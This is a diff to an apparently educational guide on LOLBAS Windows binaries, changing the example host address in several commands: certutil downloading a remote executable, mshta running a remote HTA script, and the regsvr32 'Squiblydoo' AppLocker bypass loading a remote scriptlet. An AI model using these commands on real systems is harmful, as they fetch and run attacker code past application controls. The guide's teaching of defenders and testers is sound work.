@@ -36,13 +36,13 @@ The site indexes each binary by capability — `Download`, `Execute`, `AWL Bypas
 
 ```console
 :: certutil — download (it's a certificate tool, but fetches any URL)
-C:\> certutil -urlcache -split -f http://10.0.0.5/a.exe a.exe
+C:\> certutil -urlcache -split -f http://198.51.100.9/a.exe a.exe
 
 :: mshta — execute remote script (HTML Application host)
-C:\> mshta http://10.0.0.5/p.hta
+C:\> mshta http://198.51.100.9/p.hta
 
 :: regsvr32 — AppLocker bypass via remote scriptlet ("Squiblydoo")
-C:\> regsvr32 /s /n /u /i:http://10.0.0.5/f.sct scrobj.dll
+C:\> regsvr32 /s /n /u /i:http://198.51.100.9/f.sct scrobj.dll
 ```
 
 Each LOLBAS entry lists the command, the capability, and the detection notes — so you also learn what defenders will see.
@@ -57,7 +57,7 @@ C:\> evil.exe
 This app has been blocked by your system administrator. (AppLocker)
 
 :: the same download via a trusted built-in — allowed
-C:\> certutil -urlcache -split -f http://10.0.0.5/a.exe a.exe
+C:\> certutil -urlcache -split -f http://198.51.100.9/a.exe a.exe
 CertUtil: -URLCache command completed successfully.
 ```
 
